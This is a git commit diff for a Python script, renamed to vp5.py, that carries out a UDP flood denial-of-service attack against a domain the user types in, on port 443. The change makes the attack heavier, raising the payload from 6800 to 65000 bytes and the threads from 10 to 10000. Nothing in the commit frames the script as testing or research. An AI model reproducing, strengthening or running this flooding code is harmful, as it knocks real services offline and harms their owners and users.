5086c61bf1c0acba08e29f7c0ce5c584ac90d13a
zxneoawdasa <zxenotemporary@proton.me>
2025-02-03 13:38:19 +0000

    Update and rename vp2.py to vp5.py

--- vp5.py
+++ vp5.py
@@ -5,7 +5,7 @@ import time
 
 def ddos(target, port, duration):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    data = random._urandom(6800)
+    data = random._urandom(65000)
     timeout = time.time() + duration
     sent = 0
     while True:
@@ -17,16 +17,17 @@ def ddos(target, port, duration):
             print(f"Sent {sent} packets to {target} on port {port}")
         except Exception as e:
             print(f"Failed to send packet: {e}")
+
     print(f"Sent {sent} packets to {target} on port {port} in {duration} seconds")
 
 def get_target_domain():
-    return input("Enter the domain name: ")
+    return input("Enter the target domain name: ")
 
 def main():
     target_domain = get_target_domain()
     port = 443
-    duration = 60
-    num_threads = 10
+    duration = 60 
+    num_threads = 10000
     threads = []
     for i in range(num_threads):
         thread = threading.Thread(target=ddos, args=(target_domain, port, duration))
